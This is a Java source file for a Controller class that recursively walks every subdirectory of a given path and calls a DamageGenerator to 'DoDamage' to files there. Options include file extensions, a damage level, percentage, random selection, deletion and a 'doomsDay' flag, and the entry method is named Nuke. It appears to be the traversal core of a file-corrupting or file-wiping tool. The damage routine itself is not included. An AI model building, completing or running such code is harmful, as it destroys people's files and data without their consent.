package com;

import java.io.File;

public class Controller {
	private static File startpathFile;
	private static int damage, percent;
	private static String extensions[];
	private static boolean doomsDay = false;
	private static boolean random = false;
	private static boolean delete = false;
	private static boolean folders = false;

	// String start
	public Controller(String path, int damage, String[] extensions, boolean random, boolean delete, int percent, boolean folders, boolean dday) {
		Controller.startpathFile = new File(path);
		Controller.damage = damage;
		Controller.extensions = extensions;
		Controller.doomsDay = dday;
		Controller.random = random;
		Controller.delete = delete;
		Controller.percent = percent;
		Controller.folders = folders;

	}

	// File Start
	public Controller(File path, int damage, String[] extensions, boolean random, boolean delete, int percent, boolean folders, boolean dday) {
		Controller.startpathFile = path;
		Controller.damage = damage;
		Controller.extensions = extensions;
		Controller.doomsDay = dday;
		Controller.random = random;
		Controller.delete = delete;
		Controller.percent = percent;
		Controller.folders = folders;
		
	}

	public void Nuke() {
		//scan all the directories
		File[] listFolders = new DirectoryScanner(startpathFile).Directories();
		// NUKE this path last to save the program time
		new DamageGenerator(damage, startpathFile, extensions, random, percent, delete, folders, doomsDay).DoDamage();
		// for cycle to walk around all directories
		for (int i = 0; i < listFolders.length; i++) {
			//Nukes all paths
			new Controller(listFolders[i], damage, extensions, random, delete, percent, folders, doomsDay).Nuke();
		}


	}
}
